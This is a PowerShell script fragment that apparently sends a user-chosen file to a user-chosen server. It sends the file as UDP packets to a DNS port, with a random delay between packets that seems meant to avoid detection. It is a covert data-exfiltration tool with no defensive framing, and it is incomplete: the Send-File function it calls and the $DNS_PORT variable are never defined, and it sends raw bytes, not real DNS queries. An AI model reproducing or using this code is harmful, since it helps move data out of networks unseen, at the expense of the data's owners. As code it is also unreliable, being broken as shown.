# Function to resolve a DNS name to an IP address if necessary
function Resolve-DnsNameOrIp {
    param (
        [string]$server
    )

    # Check if the input is already a valid IP address
    if ([System.Net.IPAddress]::TryParse($server, [ref]$null)) {
        return $server  # Return the valid IP address as-is
    } else {
        # Attempt to resolve the DNS name to an IP address
        try {
            $resolvedIP = [System.Net.Dns]::GetHostAddresses($server) | Where-Object { $_.AddressFamily -eq 'InterNetwork' }
            if ($resolvedIP.Count -gt 0) {
                return $resolvedIP[0].IPAddressToString  # Return the first resolved IPv4 address
            } else {
                throw "No IPv4 address found for the DNS name."
            }
        } catch {
            Write-Host "Error: Unable to resolve '$server' to an IP address." -ForegroundColor Red
            throw $_  # Re-throw the exception to handle it elsewhere
        }
    }
}

# Function to send a DNS query with a random delay
function Send-DNSQuery {
    param (
        [string]$data,
        [string]$server,
        [double]$maxDelay
    )

    # Resolve DNS name or use IP address
    try {
        $serverIP = Resolve-DnsNameOrIp -server $server
        $serverEndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($serverIP), $DNS_PORT)
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $queryBytes = [System.Text.Encoding]::ASCII.GetBytes($data)
        
        $udpClient.Send($queryBytes, $queryBytes.Length, $serverEndPoint)
        $udpClient.Close()

        # Add a random delay between 0.1 seconds and the user-provided maximum delay
        $delay = Get-Random -Minimum 0.1 -Maximum $maxDelay
        Write-Host "Query sent, delaying next query by $([Math]::Round($delay, 2)) seconds."
        Start-Sleep -Seconds $delay
    } catch {
        Write-Host "Error sending DNS query: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Example usage of the main function, asking for DNS name or IP
$filePath = Read-Host "Enter the file path to send"
$server = Read-Host "Enter the DNS name or IP address of the server"
$maxDelay = [double](Read-Host "Enter the maximum delay (in seconds) between queries")

Send-File -filePath $filePath -maxDelay $maxDelay -server $server
